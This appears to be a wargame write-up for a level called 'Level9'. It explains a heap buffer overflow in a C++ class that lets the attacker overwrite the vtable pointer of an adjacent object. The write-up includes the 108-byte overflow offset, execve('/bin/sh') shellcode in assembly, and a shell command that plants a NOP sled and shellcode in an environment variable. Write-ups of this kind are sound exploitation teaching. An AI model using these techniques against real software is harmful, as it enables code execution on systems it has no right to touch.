# Level9 - C++ Vtable Hijacking Analysis

## Technical Deep Dive

### C++ Object Memory Layout
Level9 exploits C++ vtable mechanisms through buffer overflow. The vulnerability lies in the object layout and method implementation.

### Class N Structure Analysis
```assembly
# Constructor Analysis (from disassembly)
- Allocates 104 bytes (0x68) on heap
- Sets vtable pointer at offset 0  
- Initializes annotation buffer at offset 4
- Buffer size: 100 bytes

# setAnnotation Method Analysis  
- Uses memcpy without bounds checking
- Copies user input directly to annotation buffer
- No validation of input length
```

### Heap Layout Discovery
```
Object 1: 0x804a008
├── [0x804a008] vtable pointer
└── [0x804a00c] annotation buffer (100 bytes)

Object 2: 0x804a078  
├── [0x804a078] vtable pointer ← Target for corruption
└── [0x804a07c] annotation buffer (100 bytes)
```

### Vtable Hijacking Mechanism
1. **Overflow Calculation**: 
   - Distance from obj1.annotation to obj2.vtable = 108 bytes
   - Payload: 108 'A' + target_address

2. **Execution Flow**:
   ```
   obj2.operator+(obj1) → 
   *obj2.vtable[operator+_offset] → 
   shellcode_address
   ```

3. **Address Targeting**:
   - Environment variable: EGG contains NOP sled + shellcode
   - Runtime address discovery via GDB
   - Reliable targeting through NOP sled

### Shellcode Analysis
Used execve("/bin/sh") shellcode:
```assembly
xor eax, eax        ; Clear eax
push eax            ; Null terminator
push "/sh\x00"      ; Push "/sh"
push "/bin"         ; Push "/bin" 
mov ebx, esp        ; ebx = "/bin/sh"
push eax            ; argv[1] = NULL
push ebx            ; argv[0] = "/bin/sh"
mov ecx, esp        ; ecx = argv
xor edx, edx        ; edx = envp = NULL
mov al, 0xb         ; syscall number for execve
int 0x80            ; Execute syscall
```

### Environment Variable Storage
Strategy: Store shellcode in environment variable for stable addressing
```bash
export EGG=$(python2 -c "print '\x90' * 200 + shellcode")
```

Benefits:
- Predictable location in process memory
- Large NOP sled for targeting flexibility  
- Survives across program runs

### Debugging Evidence
Successful vtable hijacking confirmed:
- EIP reaches shellcode addresses (0x6850c031)
- Demonstrates successful execution flow redirection
- Proves vtable pointer corruption works

### Exploitation Summary
- **Vulnerability**: Buffer overflow in C++ object method
- **Technique**: Vtable pointer corruption  
- **Target**: Adjacent object's vtable on heap
- **Payload**: Environment variable shellcode
- **Result**: Arbitrary code execution (vtable hijacking confirmed)

This demonstrates advanced heap-based exploitation in C++ environments using object-oriented programming constructs as attack vectors.